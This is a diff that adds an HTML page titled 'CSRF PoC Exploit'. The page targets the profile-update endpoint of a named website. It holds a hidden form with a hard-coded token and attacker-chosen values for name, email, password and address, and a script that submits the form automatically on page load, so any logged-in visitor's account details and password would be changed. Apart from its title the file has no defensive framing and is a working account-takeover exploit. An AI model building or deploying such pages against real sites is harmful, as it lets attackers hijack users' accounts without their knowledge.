@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <h1>CSRF PoC Exploit</h1>
+    <form
+      id="csrfForm"
+      action="https://www.azhapasa.com/account/profile/update"
+      method="POST"
+      enctype="multipart/form-data"
+    >
+      <!-- CSRF Token -->
+      <input
+        type="hidden"
+        name="_token"
+        value="2Y1EMespIrbuvy5Y588LPLsoq7TgLAPuTnPtk6mI"
+      />
+
+      <!-- Malicious data -->
+      <input type="hidden" name="name" value="Hacked Name" />
+      <input type="hidden" name="email" value="hacker@example.com" />
+      <input type="hidden" name="contact_no" value="1234567890" />
+      <input type="hidden" name="password" value="NewP@ssw0rd!" />
+      <input type="hidden" name="new_password" value="NewP@ssw0rd!" />
+      <input type="hidden" name="confirm_password" value="NewP@ssw0rd!" />
+      <input type="hidden" name="avatar" value="" />
+      <input type="hidden" name="dzongkhag" value="" />
+      <input type="hidden" name="location" value="" />
+      <input type="hidden" name="lat" value="" />
+      <input type="hidden" name="long" value="" />
+      <input type="hidden" name="address" value="123 Hacker St" />
+      <input type="hidden" name="work_address" value="456 Evil Corp" />
+
+      <input type="submit" value="Submit CSRF Request" />
+    </form>
+
+    <script>
+      // Auto-submit the form to perform the CSRF attack
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
